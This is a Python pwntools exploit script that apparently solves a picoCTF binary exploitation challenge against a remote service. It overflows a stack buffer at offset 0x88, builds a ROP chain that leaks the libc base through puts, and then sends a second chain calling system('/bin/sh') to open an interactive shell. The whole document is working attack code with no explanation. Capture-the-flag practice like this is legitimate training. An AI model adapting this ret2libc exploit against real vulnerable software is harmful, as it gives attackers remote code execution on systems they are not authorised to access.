#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './vuln' 

LOCAL = False

if LOCAL:
  r    = process(fname)
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
  r    = remote('mercury.picoctf.net', 37289)
  libc = ELF('./libc.so.6')

e      = ELF(fname)
rop    = ROP(e)

# ret2libc leak
rop.call('puts', [e.got.puts])

payload = flat({
  0x88: rop.chain() + p64(e.sym.do_stuff)
 })

r.sendline(payload)

libc.address = u64(r.recvline_contains('\x7f').strip().ljust(8, b'\x00')) - libc.sym.puts
success(f'Libc base: {libc.address:#04x}')

# ret2libc
rop = ROP(libc, base=libc.address)
rop.call(rop.ret[0])
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = flat({
  0x88: rop.chain()
 })

r.sendline(payload)

r.interactive()